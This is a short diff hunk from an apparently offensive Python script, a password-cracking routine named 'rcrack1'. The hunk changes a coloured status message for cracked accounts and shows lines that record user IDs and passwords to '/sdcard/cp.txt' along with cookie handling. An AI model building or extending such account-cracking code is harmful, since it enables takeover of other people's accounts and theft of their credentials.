@@ -540,7 +540,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-               print(f"\x1b[38;5;196m[RED OK🔴] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
+               print(f"\x1b[38;5;196m[RED CP R🔴] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
 
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
